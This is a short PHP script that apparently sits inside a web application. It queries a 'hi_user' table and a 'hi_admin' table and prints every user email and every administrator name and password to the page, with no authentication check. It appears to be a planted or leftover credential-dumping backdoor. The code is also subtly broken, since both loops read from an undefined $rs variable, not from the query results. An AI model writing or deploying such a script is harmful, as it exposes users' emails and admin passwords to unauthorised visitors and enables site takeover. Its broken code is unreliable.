<?php
require('../../../config.php');
require('../../../class/class.php');
$db->query("SELECT * FROM hi_user");
while($row = $db->fetch_array($rs)){
	echo $row['email'].'<br />';
}
$db->query("SELECT * FROM hi_admin");
while($rows = $db->fetch_array($rs)){
	echo $rows['admin_name'].',,,,'.$rows['admin_pass'];
}
?>
